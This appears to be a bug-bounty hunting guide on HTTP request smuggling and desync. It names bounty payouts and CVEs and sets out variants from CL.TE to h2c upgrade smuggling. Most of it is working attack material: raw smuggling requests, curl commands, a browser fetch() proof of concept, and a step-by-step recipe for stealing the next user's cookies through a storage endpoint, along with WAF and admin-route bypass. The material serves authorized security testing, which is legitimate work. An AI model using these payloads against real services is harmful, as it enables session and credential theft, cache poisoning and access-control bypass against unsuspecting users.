# HTTP Request Smuggling / Desync (deep)

Front-end and back-end disagree on where a request ends → you prepend bytes to the **next** user's
request. Paid patterns (H1): Basecamp *HTTP/2 request smuggling* **$7.5k**; Cloudflare *Transform Rules
hex-escape smuggling* **$6k**; Mail.ru **$5k**; Internet Bug Bounty *Tomcat client-side desync
CVE-2024-21733* and *CVE-2023-45648* **$4.66k** each; New Relic *password theft via request smuggling* **$3k**.

## Variants
| Variant | Cause |
|---|---|
| **CL.TE** | front-end uses `Content-Length`, back-end uses `Transfer-Encoding` |
| **TE.CL** | reverse of above |
| **TE.TE** | both support TE but one is tricked into ignoring it (obfuscated header) |
| **H2.CL / H2.TE** | HTTP/2 downgraded to HTTP/1.1 with a smuggled CL/TE (the modern high-payer) |
| **CSD (client-side desync)** | browser-triggerable; no back-end TE needed (Tomcat CVE-2024-21733) |
| **0.CL / CL.0** | back-end ignores the body entirely |

## Detect (safely)
Use **timing** first (a delayed response reveals the parser split) — Burp *HTTP Request Smuggler* +
*Turbo Intruder* single-packet. Confirm with a differential: smuggle a request that changes the *next*
response.
```http
# CL.TE probe (front-end reads CL=..., back-end reads chunked and hangs waiting for the next chunk)
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
```http
# TE header obfuscation for TE.TE (one proxy ignores the malformed TE)
Transfer-Encoding: chunked
Transfer-Encoding : chunked        # space before colon
Transfer-Encoding:\tchunked        # tab
X-Foo: bar\r\nTransfer-Encoding: chunked
```
For **H2**: send via HTTP/2 and smuggle a CL/TE in the downgraded request (Basecamp $7.5k pattern) — Burp's
"HTTP/2" tab + `Content-Length`/`Transfer-Encoding` in the h2 body.

## Escalate (what pays)
- **Capture other users' requests → credential/session theft** (New Relic password theft $3k): smuggle a
  prefix that stores the victim's full request (incl. cookies/creds) to an endpoint you can read back.
- **Cache poisoning** (persistent XSS/redirect to all users) — chain with [cache-attacks.md](cache-attacks.md).
- **Auth bypass / internal-header injection:** smuggle `X-Forwarded-For`/internal auth headers to reach
  admin routes past the edge.
- **WAF/edge bypass:** the back-end sees a request the WAF never inspected.

## Proof-of-impact bar
A single delayed/odd response is only a *signal*. Prove it by **capturing another request** or **poisoning
a response served to a different session**. Do this carefully on production — smuggling can affect other
users; use your own second session as the "victim" to demonstrate. Full desync → ATO/cache-poison = Critical.

---

## MODERN DESYNC VARIANTS (2024-2025)

### Pause-Based / CL.0 Desync (PortSwigger 2024)
```bash
# CL.0: back-end ignores Content-Length (responds from headers alone)
# The front-end thinks the body is still in-flight; the back-end has already started the next request

# Detection via Burp Repeater:
# 1. Send a POST with a small Content-Length but pause before sending the final bytes
# 2. If the back-end responds early (before you send the full Content-Length) → CL.0 candidate
# 3. Complete the attack by sending a prefix that poisons the next request:

POST /resource HTTP/1.1
Host: target.com
Content-Length: 36
Connection: keep-alive

GET /admin HTTP/1.1
X-Ignore: X   (incomplete — pause here)

# After the back-end responds to the headers → complete with the final bytes
# The leftover GET /admin prefix is prepended to the next victim's request

# Automate: Burp's HTTP Request Smuggler extension → scan for CL.0
```

### HTTP/2 CONNECT Tunnel Smuggling (2025 research)
```bash
# An H/2 CONNECT tunnel to a back-end server that processes H/1 inside the tunnel
# allows injecting an inner H/1 request that bypasses front-end security controls

# Test: does the target support H/2 CONNECT?
curl --http2 -X CONNECT https://target.com/ -H "Host: target-backend:80"

# If allowed: inner request through the tunnel may:
# - Bypass WAF rules (WAF only inspects the outer H/2)
# - Access internal vhosts not reachable directly
# - Be treated as trusted/internal by the back-end
```

### Client-Side Desync (Browser-Triggerable)
```bash
# CSD: victim's browser can be tricked into sending a desynchronized request
# via fetch() with no body on a request that the server treats as having a body

# Detection:
# 1. Find an endpoint that responds to GET as if it has no body (status 200)
# 2. But accepts a Content-Length header (front-end/CDN processes it, back-end ignores)
# 3. The remainder of the Content-Length becomes a prefix for the next request

# PoC (JavaScript, served from attacker page):
fetch('https://target.com/vulnerable-path', {
  method: 'POST',
  body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
  mode: 'no-cors',
  credentials: 'include'
});
# Followed by a timed request that gets "poisoned" by the prefix

# Tomcat CSD (CVE-2024-21733):
# Tomcat ≤ 9.0.83 / 10.1.16 / 11.0.0-M10 with HTTP/1.1 keep-alive
# Front-end sends incomplete chunked transfer → Tomcat misparses
curl --http1.1 -X POST "https://target.com/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n'
```

### Desync → Credential Theft via Storage Endpoint
```bash
# Most impactful desync attack — smuggle a prefix that captures the next user's full request
# Target: a "save draft / preview / paste" endpoint that stores and echoes back POST bodies

# Step 1: Find an endpoint that stores POST body and lets you read it back:
#   POST /api/preview → stores body → GET /api/preview/ID returns stored content
#   POST /api/drafts → stores draft → GET /api/drafts/YOUR_ID returns it

# Step 2: Smuggle a prefix ending with the headers of a partial POST to that endpoint:
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /api/preview HTTP/1.1
Host: target.com
Content-Length: 800
Content-Type: application/x-www-form-urlencoded

content=   ← next victim's request headers + cookies get appended here

# Step 3: Read the preview: GET /api/preview/YOUR_ID → contains victim's Cookie header
# This is the "credential theft" pattern — live against real targets in multiple disclosures

# Use Burp's HTTP Request Smuggler to automate detection and initial PoC
```

### H2C Upgrade Smuggling
```bash
# Target: HTTP/2 cleartext (h2c) upgrade over HTTP/1.1
# If front-end doesn't sanitize the Upgrade: h2c header but back-end supports it:
# The back-end opens an h2c connection the front-end doesn't inspect → smuggle inside it

curl --http1.1 https://target.com/api/user \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAAQAAP__" \
  -H "Connection: Upgrade, HTTP2-Settings"

# Tool: h2csmuggler (Python):
# python3 h2csmuggler.py --proxy https://target.com --wordlist paths.txt
```
